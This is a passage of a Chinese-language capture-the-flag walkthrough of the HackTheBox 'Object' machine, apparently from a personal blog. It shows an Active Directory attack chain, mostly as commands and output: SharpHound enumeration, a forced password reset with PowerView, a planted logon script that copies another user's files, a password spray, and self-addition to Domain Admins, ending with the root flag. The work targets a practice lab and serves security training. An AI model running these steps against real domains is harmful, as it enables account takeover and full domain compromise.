2026-05-05T21:04:38.5931711-07:00|INFORMATION|Consumers finished, closing output channel
Closing writers
2026-05-05T21:04:38.6088055-07:00|INFORMATION|Output channel closed, waiting for output task to complete
2026-05-05T21:04:38.7338065-07:00|INFORMATION|Status: 295 objects finished (+295 42.14286)/s -- Using 81 MB RAM
2026-05-05T21:04:38.7338065-07:00|INFORMATION|Enumeration finished in 00:00:07.9485748
2026-05-05T21:04:38.8275593-07:00|INFORMATION|Saving cache with stats: 17 ID to type mappings.
 0 name to SID mappings.
 1 machine sid mappings.
 3 sid to domain mappings.
 0 global catalog mappings.
2026-05-05T21:04:38.8588657-07:00|INFORMATION|SharpHound Enumeration Completed at 9:04 PM on 5/5/2026! Happy Graphing!
*Evil-WinRM* PS C:\programdata\apps> dir


    Directory: C:\programdata\apps


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         5/5/2026   9:04 PM          29932 20260505210432_SharpHound.zip


*Evil-WinRM* PS C:\programdata\apps> download 20260505210432_SharpHound.zip
                                        
Info: Downloading C:\programdata\apps\20260505210432_SharpHound.zip to 20260505210432_SharpHound.zip
                                        
Info: Download successful!
```

在 Bloodhound 寻找到攻击链。

![](Pasted%20image%2020260506140056.png)

准备好 `PowerView.ps1`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Object]
└─$ ls -liah PowerView.ps1 
2794147 -rwxrwxr-x 1 kali kali 753K May  6 02:01 PowerView.**ps1**
```

上传至靶机，准备好环境。

```bash
*Evil-WinRM* PS C:\programdata\apps> upload PowerView.ps1
                                        
Info: Uploading /home/kali/Work/Kali/Object/PowerView.ps1 to C:\programdata\apps\PowerView.ps1
                                        
Data: 1027036 bytes of 1027036 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\programdata\apps> dir


    Directory: C:\programdata\apps


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         5/5/2026  10:53 PM          29968 20260505225301_SharpHound.zip
-a----         5/5/2026  10:53 PM           1403 MWU2MmE0MDctMjBkZi00N2VjLTliOTMtYThjYTY4MjdhZDA2.bin
-a----         5/5/2026  11:04 PM         770279 PowerView.ps1
-a----         5/5/2026  10:51 PM        1351680 SharpHound.exe


*Evil-WinRM* PS C:\programdata\apps> . .\PowerView.ps1

```

强制修改 `smith` 的密码。

```bash
*Evil-WinRM* PS C:\programdata\apps> $pw=ConvertTo-SecureString 'P@sswOrd' -AsPlainText -Force
*Evil-WinRM* PS C:\programdata\apps> Set-DomainUserPassword -Identity smith -AccountPassword $pw
```

使用 evil-winrm 登录。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Object]
└─$ evil-winrm -i object.htb -u 'smith' -p 'P@sswOrd'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\smith\Documents> whoami
object\smith
```

## 提权至 maria

准备好复制脚本。

```bash
*Evil-WinRM* PS C:\programdata\apps> . .\PowerView.ps1
*Evil-WinRM* PS C:\programdata\apps> $payload = @"
copy C:\Users\maria\Desktop\* C:\programdata\apps\ -Force -Recurse
icacls C:\programdata\apps /grant Everyone:F /T
"@
*Evil-WinRM* PS C:\programdata\apps> 
*Evil-WinRM* PS C:\programdata\apps> $payload | Out-File C:\programdata\apps\foo.ps1 -Encoding ASCII
*Evil-WinRM* PS C:\programdata\apps> dir


    Directory: C:\programdata\apps


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         5/5/2026  10:53 PM          29968 20260505225301_SharpHound.zip
-a----         5/6/2026  12:54 AM            116 foo.ps1
-a----         5/5/2026  10:53 PM           1403 MWU2MmE0MDctMjBkZi00N2VjLTliOTMtYThjYTY4MjdhZDA2.bin
-a----         5/5/2026  11:04 PM         770279 PowerView.ps1
-a----         5/5/2026  10:51 PM        1351680 SharpHound.exe


*Evil-WinRM* PS C:\programdata\apps> type foo.ps1
copy C:\Users\maria\Desktop\* C:\programdata\apps\ -Force -Recurse
icacls C:\programdata\apps /grant Everyone:F /T

```

执行等待 `Engines.xsl`。

```bash
*Evil-WinRM* PS C:\programdata\apps> Set-DomainObject -Identity maria -SET @{scriptpath='C:\programdata\apps\foo.ps1'}
*Evil-WinRM* PS C:\programdata\apps> dir


    Directory: C:\programdata\apps


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/26/2021   8:13 AM           6144 Engines.xls

*Evil-WinRM* PS C:\programdata\apps> download Engines.xls
                                        
Info: Downloading C:\programdata\apps\Engines.xls to Engines.xls
                                        
Info: Download successful!

```

找到密码。

![](Pasted%20image%2020260506170453.png)

```bash
┌──(kali㉿kali)-[~/Work/Kali/Object]
└─$ cat password.txt                       
d34gb8@
0de_434_d545
**W3llcr4ft3d_4cls**z
```

爆破 maria 的密码。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Object]
└─$ nxc winrm object.htb -u maria -p password.txt --continue-on-success
WINRM       10.129.15.2     5985   JENKINS          [*] Windows 10 / Server 2019 Build 17763 (name:JENKINS) (domain:object.local)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.15.2     5985   JENKINS          [-] object.local\maria:d34gb8@
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.15.2     5985   JENKINS          [-] object.local\maria:0de_434_d545
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.15.2     5985   JENKINS          [+] object.local\maria:W3llcr4ft3d_4cls (Pwn3d!)

```

使用 evil-winrm 登录。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Object]
└─$ evil-winrm -i object.htb -u maria -p 'W3llcr4ft3d_4cls'                    
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\maria\Documents> whoami
object\maria
```

## 提权至 Administrator

给 maria 赋权 `Domain Admins`。

```bash
*Evil-WinRM* PS C:\programdata\apps> Set-DomainObjectOwner -Identity 'Domain Admins' -OwnerIdentity maria

*Evil-WinRM* PS C:\programdata\apps> Add-DomainObjectAcl -TargetIdentity 'Domain Admins' -PrincipalIdentity maria -Rights All
*Evil-WinRM* PS C:\programdata\apps> Add-DomainGroupMember -Identity 'Domain Admins' -Members maria
*Evil-WinRM* PS C:\programdata\apps> Get-DomainGroupMember 'Domain Admins'


GroupDomain             : object.local
GroupName               : Domain Admins
GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=object,DC=local
MemberDomain            : object.local
MemberName              : maria
MemberDistinguishedName : CN=maria garcia,CN=Users,DC=object,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-4088429403-1159899800-2753317549-1106

GroupDomain             : object.local
GroupName               : Domain Admins
GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=object,DC=local
MemberDomain            : object.local
MemberName              : Administrator
MemberDistinguishedName : CN=Administrator,CN=Users,DC=object,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-4088429403-1159899800-2753317549-500

```

重新登陆拿到 root flag。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Object]
└─$ evil-winrm -i object.htb -u maria -p 'W3llcr4ft3d_4cls'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\maria\Documents> whoami
object\maria
*Evil-WinRM* PS C:\Users\maria\Documents> cd c:\Users
*Evil-WinRM* PS C:\Users> dir


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/10/2021   3:20 AM                Administrator
d-----       10/26/2021   7:59 AM                maria
d-----       10/26/2021   7:58 AM                oliver
d-r---        4/10/2020  10:49 AM                Public
d-----       10/21/2021   3:44 AM                smith


*Evil-WinRM* PS C:\Users> cd Administrator
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
d003d52d83018f7922b089d396eecbec
```